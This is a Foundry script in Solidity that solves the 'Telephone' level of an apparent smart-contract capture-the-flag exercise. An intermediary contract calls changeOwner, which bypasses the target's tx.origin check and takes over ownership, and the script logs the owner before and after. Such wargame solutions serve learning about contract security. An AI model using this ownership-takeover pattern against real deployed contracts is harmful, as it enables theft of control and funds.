// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/04-Telephone/Telephone.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ProxyCall {
    constructor(Telephone _telephoneInstance, address _owner) {
        _telephoneInstance.changeOwner(_owner);
    }
}

contract Level04Solution is Script {
    Telephone telephoneInstance = Telephone(0xA8B5B09Aa747Cd48347Bd3Aed00bF341Dc887Fb1);

    function run() external {
        vm.startBroadcast();
        console.log("owner : ", telephoneInstance.owner());
        new ProxyCall(telephoneInstance, address(tx.origin));
        console.log("owner : ", telephoneInstance.owner());
        vm.stopBroadcast();
    }
}